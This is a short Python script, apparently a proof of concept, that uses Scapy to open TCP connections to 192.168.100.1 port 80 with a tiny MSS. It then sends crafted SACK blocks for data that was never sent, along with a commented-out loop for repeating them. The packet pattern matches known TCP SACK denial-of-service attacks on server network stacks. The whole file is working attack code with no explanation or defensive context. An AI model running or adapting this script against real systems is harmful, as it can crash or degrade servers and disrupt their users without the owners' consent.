from scapy.all import *
import time

i=IP()
i.dst="192.168.100.1"
t=TCP()
t.dport=80
t.flags="S"
t.options=[('MSS',18),('SAckOK', '')]
#sr1(i/t)
SYNACK=sr1(i/t)
seq_num=int(SYNACK.seq)

# ACK
ACK=TCP( dport=80, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
send(i/ACK)
print (seq_num)

#SACK=TCP(dport=8887,flags='A',seq=SYNACK.ack, ack=SYNACK.seq + 1)
time.sleep(1)
SACK=TCP(dport=80,flags='A',seq=SYNACK.ack , ack=SYNACK.seq + 1+0x30*2)
#print SACK.seq

num=3
SACK.options=[('SAck',(SYNACK.seq+1+0x30*3 ,SYNACK.seq+1+0x30*4 ))]
send(i/SACK)
#while num<=100:
#    SACK.options=[('SAck',(seq+1+0x30+0x30*num ,seq+1+0x30  +0x30*(num+1)))]
#    send(i/SACK)
#    num=num+1
#    if num==99:
#        num=3
time.sleep( 500 )

i=IP()
i.dst="192.168.100.1"
t=TCP()
t.sport=3333
t.dport=80
t.flags="S"
t.options=[('MSS',48),('SAckOK', ''),('Timestamp',(111,222))]

#sr1(i/t)
SYNACK=sr1(i/t)
seq=int(SYNACK.seq)

# ACK
ACK=TCP(sport=3333, dport=80, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
ACK.options=[('Timestamp',(222,333))]
send(i/ACK)
print (ACK.seq)

#SACK=TCP(dport=8887,flags='A',seq=SYNACK.ack, ack=SYNACK.seq + 1)
print (str(SYNACK.ack))
SACK=TCP(dport=80,flags='A',seq=SYNACK.ack, ack=SYNACK.seq+1+0x30)
print (SACK.seq)
SACK.options=[('SAck',(seq+1+0x38 ,seq+1+0x38  +0x30))]

#while True:

time.sleep( 1 )
send(i/SACK)
time.sleep(500)